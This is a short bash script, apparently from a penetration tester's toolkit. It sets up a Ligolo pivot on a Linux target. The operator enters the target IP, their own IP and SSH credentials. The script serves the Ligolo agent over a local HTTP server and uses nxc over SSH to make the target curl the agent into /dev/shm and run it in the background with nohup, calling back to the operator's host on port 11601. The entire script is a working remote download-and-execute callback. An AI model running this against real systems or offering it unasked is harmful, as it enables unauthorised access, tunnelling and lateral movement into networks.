# LINUX - Ligolo callback via NXC
#!/bin/bash

read -p "Enter target IP: " TARGET_IP
read -p "Enter local IP: " LOCAL_IP
read -p "Enter username: " USERNAME
read -s -p "Enter password: " PASSWORD
echo

# Start HTTP server in background
python3 -m http.server 9001 -d ~/PivotingTools/ligolo &
HTTP_PID=$!

sleep 1

# Remote execution via nxc
CMD="curl -o /dev/shm/agent http://${LOCAL_IP}:9001/agent; chmod +x /dev/shm/agent; nohup bash -c \"/dev/shm/agent -connect ${LOCAL_IP}:11601 -ignore-cert\" & 2>/dev/null"
nxc ssh "$TARGET_IP" -u "$USERNAME" -p "$PASSWORD" -x "$CMD"

# Kill HTTP server
sudo kill -9 $HTTP_PID 2>/dev/null
echo "[+] HTTP server stopped"
